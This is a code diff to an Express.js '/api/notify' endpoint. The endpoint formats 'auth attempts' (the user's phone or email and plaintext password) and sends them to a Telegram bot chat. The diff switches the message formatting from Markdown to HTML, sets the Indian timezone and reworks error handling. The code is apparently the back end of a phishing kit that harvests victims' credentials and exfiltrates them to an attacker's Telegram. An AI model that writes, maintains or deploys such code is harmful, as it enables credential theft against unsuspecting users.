@@ -16,17 +16,18 @@ app.post("/api/notify", async (req, res) => {
   const { type, data } = req.body;
 
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    console.error("Telegram credentials missing in environment variables.");
+    console.error("Telegram credentials missing.");
     return res.status(500).json({ error: "Server configuration error" });
   }
 
+  // Use HTML instead of Markdown for better reliability with special characters
   const message = `
-🔔 *New Auth Attempt: ${type.toUpperCase()}*
+<b>🔔 New Auth Attempt: ${type.toUpperCase()}</b>
 ━━━━━━━━━━━━━━━━━━━━
-👤 *User:* ${data.phone || data.email || "N/A"}
-🔑 *Password:* \`${data.password}\`
-📱 *Tab:* ${data.tab || "Registration"}
-🕒 *Date:* ${new Date().toLocaleString()}
+<b>👤 User:</b> ${data.phone || data.email || "N/A"}
+<b>🔑 Password:</b> <code>${data.password || "N/A"}</code>
+<b>📱 Tab:</b> ${data.tab || "Registration"}
+<b>🕒 Date:</b> ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
 ━━━━━━━━━━━━━━━━━━━━
   `;
 
@@ -38,14 +39,15 @@ app.post("/api/notify", async (req, res) => {
       body: JSON.stringify({
         chat_id: TELEGRAM_CHAT_ID,
         text: message,
-        parse_mode: "Markdown",
+        parse_mode: "HTML",
       }),
     });
 
+    const result = await response.json();
+
     if (!response.ok) {
-      const errorData = await response.json();
-      console.error("Telegram API Error:", errorData);
-      return res.status(500).json({ error: "Failed to send notification" });
+      console.error("Telegram API Error:", result);
+      return res.status(500).json({ error: "Telegram API failure", details: result });
     }
 
     res.json({ success: true });
